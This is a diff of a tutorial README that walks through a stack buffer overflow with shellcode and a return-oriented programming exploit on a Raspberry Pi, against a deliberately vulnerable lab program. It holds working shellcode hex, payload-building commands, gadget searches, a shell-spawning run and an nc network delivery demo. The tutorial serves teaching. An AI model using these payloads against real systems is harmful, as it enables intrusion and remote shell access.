@@ -8,25 +8,32 @@ blog post [Return-oriented programming on 64-bit
 Linux](https://crypto.stanford.edu/~blynn/rop/). In this tutorial, we
 demonstrate similar techniques on an ARM architecture, using a [Raspberry
 Pi 3](https://www.raspberrypi.org/products/raspberry-pi-3-model-b/)
-running the Raspbian Linux operating system. 
+running the Raspbian Linux operating system.
 
 ## Operating system for the tutorial
+
 [Raspbian](https://www.raspberrypi.org/downloads/raspbian/) (kernel
 version 4.14). Running `uname -a` gives `Linux rpi 4.14.37-v7+ \#1111
 SMP Thu Apr 26 13:56:59 BST 2018 armv7l GNU/Linux`
 
 ## Disablement of Linux platform countermeasures
+
 For a demonstration purpose, in this tutorial, we shall disable Linux
-platform provided anti-exploitation countermeasures: 
+platform provided anti-exploitation countermeasures:
+
 ### Stack smash protector (SSP, stack canary): disable for Part 1 and Part 2
+
 When building vulnerable code
-```
+
+```bash
 $ gcc -fno-stack-protector [other args] badcode.c
 ```
 
 ### Non-executable stack (data execution prevention, DEP): disable for Part 1
+
 Mark binary `badcode` as requiring executable stack. 
-```
+
+```bash
 $ execstack -s ./badcode
 ```
 
@@ -38,13 +45,17 @@ use for this demonstration. And therefore, this step is redundant on
 this particular platform.
 
 ### Address space layout randomization (ASLR): disable for Part 1 and Part 2
+
 One can either disable ASLR on the vulnerable binary only during
 execution time
+
+```bash
+$ setarch $(arch) -R ./badcode
 ```
-$ setarch `arch` -R ./badcode
-```
+
 or temporarily disable ASLR on the entire platform
-```
+
+```bash
 $ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 ```
 
@@ -59,7 +70,8 @@ In this section, we demonstrate how to overwrite the vulnerable code's
 stored on the stack.
 
 ### The stack layout for this exploit
-```
+
+```text
     --- bottom of stack ---
   
     return addr: addr of &buf[0]
@@ -70,23 +82,28 @@ stored on the stack.
 
     ---  top of stack   ---
 ```
+
 ### The shellcode
+
 The shell code uses the `execve` system call to invoke `/bin/sh`.
 
 The shell code can be extracted from the executable 'shell', compiled out of
 the source file [shell.c](src/shell.c), by the procedures that follow:
 
-```
+```bash
 $ cd src
 $ make shell
 ```
 
 Now the ELF 32-bit LSB executable 'shell' is generated. We use `objdump` to
 inspect the shell code of interest.
-```
+
+```bash
 $ objdump -d shell | sed -n '/needle0/,/needle1/p'
 ```
+
 This prints
+
 ```assembly
 000103f0 <needle0>:
    103f0:	ea000004 	b	10408 <lab1>
@@ -109,7 +126,8 @@ This prints
 
 Because '0x415-0x3f0' equals 37 in decimal, we round it to 40 bytes (so
 that the code is 4-byte aligned) for the shell code.
-```
+
+```bash
 $ xxd -s0x3f0 -l40 -p shell > shellcode.txt
 $ cat shellcode.txt
 040000ea0e00a0e1011021e0022022e00b70a0e3000000eff9ffffeb2f62
@@ -120,20 +138,24 @@ This is the shell code we are going to jump to after overrunning the stack
 buffer later.
 
 ### The bad code
+
 The bad C code, [badcode.c](src/badcode.c), exhibits a classic buffer overflow
 on the stack. To compile the code without stack protection and DEP, two
 OS-added anti-exploitation countermeasures, for the demonstration purpose, do
-```
+
+```bash
 $ make badcode
 ```
 
 Now let's get some idea about the stack layout in the 'badcode' program.
-```
+
+```bash
 $ gdb ./badcode
 ```
 
 Within the `gdb` console, disassemble the 'main' function
-```
+
+```bash
 (gdb) disas main
 Dump of assembler code for function main:
    0x0001047c <+0>:	push	{r11, lr}
@@ -187,8 +209,9 @@ Our exploitation strategy is therefore as follows:
 For the demonstration, we also disable ASLR when running the 'badcode'
 program (in the meanwhile 'badcode' also prints out the address of 'buf', to
 simplify the demonstration).
-```
-$ setarch `arch` -R ./badcode
+
+```bash
+$ setarch $(arch) -R ./badcode
 0x7efff1f8
 Enter name:
 ```
@@ -199,15 +222,17 @@ To implement the above strategy
    test run above.
 2. Prepare the payload file 'payload'
 
-   ```
-   $ pad=$(for i in `seq 40`; do echo -n '42'; done)
+   ```bash
+   $ pad=$(for i in $(seq 40); do echo -n '42'; done)
    $ r11=$(printf %08x 0x0 | tac -rs..)
    $ ret=$(printf %08x 0x7efff1f8 | tac -rs..) # little endian
    $ (cat shellcode.txt; echo -n $pad; echo -n $r11; echo -n $ret) | xxd -r -p > payload
    ```
+
    If we run `xxd payload`, we will see the payload content as
    follows:
-   ```
+
+   ```text
    0000000: 0400 00ea 0e00 a0e1 0110 21e0 0220 22e0  ..........!.. ".
    0000010: 0b70 a0e3 0000 00ef f9ff ffeb 2f62 696e  .p........../bin
    0000020: 2f62 6173 6800 dead 4242 4242 4242 4242  /bash...BBBBBBBB
@@ -218,14 +243,15 @@ To implement the above strategy
 
 3. Run exploit (using `cat` as stdin)
 
-   ```
-   $ (cat payload; cat) | setarch `arch` -R ./badcode
+   ```bash
+   $ (cat payload; cat) | setarch $(arch) -R ./badcode
    0x7efff1f8
    Enter name:
    ```
+
    Press 'enter', and now we have the shell
 
-   ```
+   ```bash
    date
    Fri May  4 02:05:24 CST 2018
    uname -r
@@ -261,7 +287,8 @@ stack.
 ## Part 2: Return-oriented programming exploit on ARMv7
 
 ### The stack layout for this exploit
-```
+
+```text
     --- bottom of stack ---
 
      addr of 'system()'
@@ -278,14 +305,16 @@ stack.
 ```
 
 ### The bad code with DEP
+
 Our bad code is the same as before at the source level. But we turn on
 non-executable stack.
-```
+
+```bash
 $ cd src
 $ make badcode_dep
 ```
-The vulnerable binary is generated as 'badcode_dep'.
 
+The vulnerable binary is generated as 'badcode_dep'.
 
 ### Return on ARM
 
@@ -301,7 +330,8 @@ stack content carefully, and bootstrap the jump to (a chain of)
 instructions such as `pop {r0, ..., pc}` to cause the program control
 flow to hit `system("/bin/sh")`.
 
-## The procedures 
+## The procedures
+
 It might be tempting to put the string "/bin/sh" inside the buffer that
 is being overflown. However, because the buffer is on the stack, and
 subsequent function invocations (e.g., 'system()') may destroy this
@@ -309,7 +339,8 @@ content, doing so will make the exploit unreliable, and often causes a
 SIGSEGV before the shell gets to run. A better strategy is to find the
 location of the string "/bin/bash" in other parts of the program's
 memory space, for example, in 'libc'. In gdb, we do
-```
+
+```bash
 (gdb) b main
 Breakpoint 1 at 0x10490: file badcode.c, line 7.
 (gdb) run
@@ -330,19 +361,23 @@ warning: Unable to access 16000 bytes of target memory at 0x76f93528, halting se
 This way, we find the memory address 0x76f83b20, at which the string
 "/bin/sh" resides. Save the hexadecimal representation of this address
 to a variable $r0:
-```
+
+```bash
 $ r0=$(printf %08x 0x76f83b20 | tac -rs..)
 ```
 
 Next, we search for a ROP gadget of the form 'pop {r0, ..., pc}' in shared
 libraries loaded by the vulnerable program. For example, searching in
 'libc'
-```
+
+```bash
 $ objdump -d /lib/arm-linux-gnueabihf/libc-2.19.so | grep -B5 "pop.*r0.*pc"
 ```
+
 we get a number of reasonable choices such as 'pop     {r0, r4, pc}', as
 shown below
-```
+
+```text
    7a118:	25714001 	ldrbcs	r4, [r1, #-1]!
    7a11c:	2551c001 	ldrbcs	ip, [r1, #-1]
    7a120:	15603001 	strbne	r3, [r0, #-1]!
@@ -367,11 +402,14 @@ shown below
 
 It turns out, a more straightforward gadget 'pop {r0, pc}' is readily
 available in 'libarmmem.so'
-```
+
+```bash
 $ objdump -d /usr/lib/arm-linux-gnueabihf/libarmmem.so | grep -B5 "pop.*r0.*pc"
 ```
+
 An example output is
-```
+
+```text
     40ec:	28a0000a 	stmiacs	r0!, {r1, r3}
     40f0:	44801004 	strmi	r1, [r0], #4
     40f4:	e1b02102 	lsls	r2, r2, #2
@@ -379,34 +417,43 @@ An example output is
     40fc:	45c01000 	strbmi	r1, [r0]
     4100:	e8bd8001 	pop	{r0, pc}
 ```
+
 We now know at the instruction 'pop     {r0, pc}' is at offset 0x4100 in
 'libarmmem.so'. And this is the gadget we are going to use for our ROP
 exploit. To find out the address of this gadget, we just need to know
 the start address of 'libarmmem.so' in the program's address space. It
 can be done by running `./badcode_dep` in one terminal, and in another
-```
+
+```bash
 $ pid=$(ps -C badcode_dep -o pid --no-header)
 $ grep libarmmem /proc/$pid/maps
 ```
+
 to get the start address 0x76fba00, as shown in the output below
-```
+
+```text
 76fba000-76fbf000 r-xp 00000000 b3:07 537813     /usr/lib/arm-linux-gnueabihf/libarmmem.so
 76fbf000-76fce000 ---p 00005000 b3:07 537813     /usr/lib/arm-linux-gnueabihf/libarmmem.so
 76fce000-76fcf000 rw-p 00004000 b3:07 537813     /usr/lib/arm-linux-gnueabihf/libarmmem.so
 ```
+
 Adding the offset 0x4100 to it, we have
-```
+
+```bash
 $ ret=$(printf %08x $((0x76fba000+0x4100)) | tac -rs..)
 ```
 
 Similarly, we obtain the address of the 'system()' function by first
 finding its offset (0x39fac) in 'libc'
-```
+
+```bash
 $ nm -D /lib/arm-linux-gnueabihf/libc-2.19.so | grep '\<system\>'
 00039fac W system
 ```
+
 and then getting the start address of 'libc' (0x76e66000) in memory
-```
+
+```bash
 $ grep libc /proc/$pid/maps     
 76e66000-76f91000 r-xp 00000000 b3:07 656699     /lib/arm-linux-gnueabihf/libc-2.19.so
 76f91000-76fa1000 ---p 0012b000 b3:07 656699     /lib/arm-linux-gnueabihf/libc-2.19.so
@@ -415,13 +462,15 @@ $ grep libc /proc/$pid/maps
 ```
 
 Adding the offset to the start address, we have
-```
+
+```bash
 $ system_addr=$(printf %08x $((0x76e66000+0x39fac)) | tac -rs..)
 ```
 
 We set up the first 84 bytes as 80-byte arbitrary data followed by the
 saved $r11 value 0x00000000.
-```
+
+```bash
 $ pad=$(echo -n "ARM ROP Tutorial" | xxd -p; \
 echo -n "00"; \
 for i in `seq 63`; do echo -n "42"; done; \
@@ -429,17 +478,20 @@ echo -n "00000000")
 ```
 
 Now we complete the construction of the 96-byte ROP payload
-```
+
+```bash
 $ echo -n ${pad}${ret}${r0}${system_addr} | xxd -r -p > rop_payload
 ```
 
 Run the ROP exploit
-```
+
+```bash
 $ (cat rop_payload ; cat) | ./badcode_dep 
 ```
 
 Hit a few enters to get in the spawned shell.
-```
+
+```bash
 Enter name:
 
 ARM ROP Tutorial
@@ -459,24 +511,30 @@ of our exploit.
 ## How to demonstrate the attack over the network
 
 * On victim machine, change to the `src` directory. On one terminal
-  ```
+
+  ```bash
   $ mkfifo pip
   $ nc -l 3333 > pip # listening on port 3333: DANGER
   ```
+
   On another terminal
-  ```
+
+  ```bash
   $ cat pip | setarch `arch` -R ./badcode
   ```
 
 * On attacking machine, change to the `src` directory. On a terminal
-  ```
+
+  ```bash
   $ (cat payload; cat) | nc 127.0.0.1 3333
   ```
+
   In the above command, `127.0.0.1` can be replaced with the external IP
   of the victim machine.
 
 ## A list of unsafe C functions to avoid when playing with strings
-```
+
+```text
 gets
 strcpy
 strcat
@@ -484,7 +542,5 @@ sprintf
 scanf
 sscanf
 ```
-Use `memcpy` with extra care.
 
-**This is a long-overdue tutorial that I wanted to get done at least 5
-years ago. I am glad I finally did it.**
+Use `memcpy` with extra care.
